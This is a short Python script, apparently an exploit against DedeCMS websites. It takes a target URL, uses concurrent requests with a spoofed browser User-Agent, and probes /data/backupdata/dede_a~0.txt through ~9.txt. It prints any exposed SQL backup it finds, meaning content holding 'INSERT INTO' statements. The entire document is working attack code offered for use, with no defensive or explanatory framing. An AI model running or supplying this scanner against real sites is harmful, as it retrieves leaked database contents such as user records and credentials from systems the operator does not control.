import requests
import sys
import gevent
from gevent import monkey
monkey.patch_all()
headers = {"User-Agent":"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.75 Safari/537.36"}

url = sys.argv[1]
# url = 'http://demo.dede.com/'

def gev():
    threads = [gevent.spawn(attack, num) for num in range(10)]
    gevent.joinall(threads)

def attack(num):
    try:
        exp = '/data/backupdata/dede_a~{}.txt'.format(num)
        url_exp = url + exp
        res = requests.get(url=url_exp, headers=headers)
        code = res.status_code
        text = res.text
        if code == 200 and 'INSERT INTO' in text:
            print('[{}] -> {}'.format(url_exp, text))
    except Exception as e:
        pass

gev()